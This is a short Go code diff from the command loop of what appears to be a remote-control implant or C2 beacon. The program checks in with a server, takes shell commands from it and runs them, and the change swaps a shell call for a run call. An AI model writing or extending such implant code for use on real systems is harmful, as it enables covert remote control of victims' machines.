@@ -56,11 +56,11 @@ func main() {
 							case command.CMD_TYPE_CHECKIN:
 								_, execErr = packet.PullCommand()
 							case command.CMD_TYPE_SHELL:
-								var shellPath string
-								var shellBuf []byte
-								shellPath, shellBuf, execErr = command.ParseCommandShell(cmdBuf)
+								var path string
+								var args string
+								path, args, execErr = command.ParseCommandShell(cmdBuf)
 								var result []byte
-								result, execErr = command.Shell(shellPath, shellBuf)
+								result, execErr = command.Run(path, args)
 								if execErr != nil {
 									break
 								}
